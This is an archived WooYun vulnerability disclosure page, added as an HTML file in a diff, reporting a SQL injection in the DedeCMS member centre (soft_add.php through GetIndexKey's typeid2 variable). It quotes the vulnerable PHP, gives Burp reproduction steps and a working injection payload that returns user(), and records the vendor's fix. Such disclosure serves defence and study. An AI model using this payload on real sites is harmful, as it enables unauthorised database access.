@@ -1,0 +1,214 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		Dedecms 会员中心注入漏洞6  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		Dedecms 会员中心注入漏洞6  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/Matt">Matt</a> 
+</li><li>提交时间：		2014-01-14 16:56</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2014-01-14：	细节已通知厂商并且等待厂商处理中<br/>
+									2014-01-14：	厂商已经确认，细节仅向厂商公开<br/>
+									2014-01-17：	细节向第三方安全合作伙伴开放<br/>
+									2014-01-24：	细节向核心白帽子及相关领域专家公开<br/>
+									2014-02-03：	细节向普通白帽子公开<br/>
+									2014-02-23：	细节向实习白帽子公开<br/>
+									2014-04-14：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">Dedecms 会员中心注入漏洞6<br />
+我真的真的不是来刷洞刷奖金的！</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail"></p><pre><code>5&#039;,1,1,1,@`&#039;`),(&#039;-1&#039;,&#039;7&#039;,user() , &#039;3&#039;,&#039;1389688643&#039;, &#039;1389688643&#039;, &#039;8&#039;),(1,2,&#039;<br />
+<br />
+/include/helpers/archive.helper.php<br />
+if ( ! function_exists(&#039;GetIndexKey&#039;))<br />
+{<br />
+    function GetIndexKey($arcrank, $typeid, $sortrank=0, $channelid=1, $senddate=0, $mid=1)<br />
+    {<br />
+        global $dsql,$senddate,$typeid2;//typeid2调用外部 结合dede的便利覆盖即可<br />
+        if(empty($typeid2)) $typeid2 = 0;<br />
+        if(empty($senddate)) $senddate = time();<br />
+        if(empty($sortrank)) $sortrank = $senddate;<br />
+        $iquery = &quot;<br />
+          INSERT INTO `#@__arctiny` (`arcrank`,`typeid`,`typeid2`,`channel`,`senddate`, `sortrank`, `mid`)<br />
+          VALUES (&#039;$arcrank&#039;,&#039;$typeid&#039;,&#039;$typeid2&#039; , &#039;$channelid&#039;,&#039;$senddate&#039;, &#039;$sortrank&#039;, &#039;$mid&#039;) &quot;;<br />
+		 echo    $iquery;<br />
+        $dsql-&gt;ExecuteNoneQuery($iquery);<br />
+        $aid = $dsql-&gt;GetLastID();<br />
+        return $aid;<br />
+    }<br />
+}<br />
+<br />
+调用<br />
+/member/soft_add.php<br />
+else if($dopost==&#039;save&#039;)<br />
+{<br />
+    $description = &#039;&#039;;<br />
+    include(DEDEMEMBER.&#039;/inc/archives_check.php&#039;);<br />
+<br />
+    //生成文档ID<br />
+    $arcID = GetIndexKey($arcrank,$typeid,$sortrank,$channelid,$senddate,$mid);//调用了~<br />
+    if(empty($arcID))</code></pre><p class='detail'> </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">调用的地方比较多 我就不一一写出了<br />
+<br />
+测试方法 <br />
+<br />
+打开http://127.0.0.1/dede/member/soft_add.php<br />
+<br />
+<br />
+<br />
+添加软件<br />
+<br />
+然后打开BURP抓包<br />
+<br />
+讲picnum改成typeid2<br />
+<br />
+然后参数写5&#039;,1,1,1,@`&#039;`),(&#039;-1&#039;,&#039;7&#039;,user() , &#039;3&#039;,&#039;1389688643&#039;, &#039;1389688643&#039;, &#039;8&#039;),(1,2,&#039;<br />
+<br />
+就能看到注入结果了<br />
+<br />
+</p><p class="detail"><a href="../images/1416543601d8adea882ab89cdc3004a601d2bdd9.png" target="_blank"><img src="../images/1416543601d8adea882ab89cdc3004a601d2bdd9.png" alt="4.png" width="600"/></a></p><p class="detail"></p><p class="detail"><a href="../images/14165442cdc87135063259862b0ae9c480c3476c.png" target="_blank"><img src="../images/14165442cdc87135063259862b0ae9c480c3476c.png" alt="5.png" width="600"/></a></p><p class="detail"></p><p class="detail"><a href="../images/14165451be776b3e8c8e8967117de3a255a894ee.png" target="_blank"><img src="../images/14165451be776b3e8c8e8967117de3a255a894ee.png" alt="6.png" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">过滤啊！ </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/Matt" title="Matt">Matt</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-048892" title="Dedecms 会员中心注入漏洞6">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：中</p>
+						<p class="detail">漏洞Rank：6 </p>
+													<p class="detail">确认时间：2014-01-14 22:24</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">已修复，感谢反馈</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="48892";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
